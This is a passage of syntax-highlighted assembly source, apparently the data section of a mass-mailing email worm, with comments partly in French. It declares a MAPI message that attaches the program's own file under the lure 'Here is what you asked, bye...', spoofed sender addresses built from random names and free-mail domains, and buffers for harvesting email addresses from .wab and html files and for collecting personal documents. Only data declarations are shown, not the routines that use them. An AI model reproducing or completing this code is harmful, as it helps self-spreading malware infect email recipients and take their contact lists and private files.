</span><span class="sc5">RndFromNameTb</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndFromName1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndFromName2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndFromName3</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndFromName4</span><span class="sc0"> 
</span><span class="sc5">NbFromName</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndFromNameTb</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
                
</span><span class="sc5">RndFromServ1</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'@caramail.com'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RndFromServ2</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'@hotmail.com'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RndFromServ3</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'@aol.com'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RndFromServTb</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndFromServ1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndFromServ2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndFromServ3</span><span class="sc0">
</span><span class="sc5">NbFromServ</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RndFromServTb</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">


</span><span class="sc1">;...................... Email MAPI Variables</span><span class="sc0">

</span><span class="sc5">IConnectedStateTemp</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; For InternetConnectedState</span><span class="sc0">

</span><span class="sc5">MapiMessage</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">subject</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">textmail</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">date</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MsgFrom</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MsgTo</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MapiFileDesc</span><span class="sc0">

</span><span class="sc5">MsgFrom</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">namefrom</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mailfrom</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">MsgTo</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nameto</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CurrentEmail</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">MapiFileDesc</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MyPath</span><span class="sc0">   </span><span class="sc1">; File to attache</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">CurrentEmail</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc5">EmailSize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">MAPISession</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">subject</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'Hello'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">date</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">''</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">namefrom</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">''</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">mailfrom</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc5">EmailSize</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">nameto</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">''</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">textmail</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'Hi '</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
                  </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'Here is what you asked, bye... '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;...................... Residency + Dump Variables</span><span class="sc0">

</span><span class="sc5">MutexHdl</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MyPath</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">TempFileHandle</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ByteWritten</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;...................... Email Search Variables</span><span class="sc0">

</span><span class="sc5">NbEmailFound</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Compte combien d'email found</span><span class="sc0">
</span><span class="sc5">EmailList</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Ptr zone Mem ou stocker Emails </span><span class="sc0">
                                                            
</span><span class="sc5">TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">fhandle</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; To find &amp; map file</span><span class="sc0">
</span><span class="sc5">mapaddress</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">maphandle</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                

</span><span class="sc5">maphandlemail</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; for html found         </span><span class="sc0">
</span><span class="sc5">esi_save</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">EmailCurrentPos</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">RandomNb</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Init with GettickCount</span><span class="sc0">

</span><span class="sc5">NbWabEmail</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Nb emails in *.Wab</span><span class="sc0">

</span><span class="sc1">;...................... Recursive Search Variables</span><span class="sc0">

</span><span class="sc5">RecSearchHandle</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; For the Recursive search</span><span class="sc0">
</span><span class="sc5">RoutineToCall</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Ptr on routine to execute in all SubDir</span><span class="sc0">

</span><span class="sc5">PersonalSearchHandle</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; For personal doc search</span><span class="sc0">
</span><span class="sc5">NbPersonalFound</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Nb Personal doc found</span><span class="sc0">
</span><span class="sc5">PersoDocListe</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Ptr zone Mem ou stocker Path Doc Perso </span><span class="sc0">

</span><span class="sc1">;--------------------------- Structures Zone ---------------------------------</span><span class="sc0">

</span><span class="sc1">;...................... Search File Structure</span><span class="sc0">

</span><span class="sc5">filetim</span><span class="sc0">             </span><span class="sc9">struct</span><span class="sc0">
</span><span class="sc5">FT_dwLowDateT</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FT_dwHighDateT</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">filetim</span><span class="sc0">             </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">w32fd</span><span class="sc0">           </span><span class="sc9">struct</span><span class="sc0">
</span><span class="sc5">FileAttributes</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CreationTime</span><span class="sc0">      </span><span class="sc5">filetim</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">LastAccessTime</span><span class="sc0">    </span><span class="sc5">filetim</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">LastWriteTime</span><span class="sc0">     </span><span class="sc5">filetim</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FileSizeHigh</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FileSizeLow</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Reserved0</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Reserved1</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FileName</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">AlternateFileN</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
                  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">w32fd</span><span class="sc0">               </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">search</span><span class="sc0">            </span><span class="sc5">w32fd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc1">;...................... System Time Structure</span><span class="sc0">

</span><span class="sc5">SystemTimeData</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> 
</span><span class="sc5">STDYear</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">STDMonth</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">STDDayOfWeek</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">STDDay</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">STDHour</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">STDMinute</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">STDSecond</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">STDMilliseconds</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc1">;...................... Sockets Structure</span><span class="sc0">

</span><span class="sc5">WSAData</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">      
                </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">257</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">129</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Mv</span></div></body>
</html>
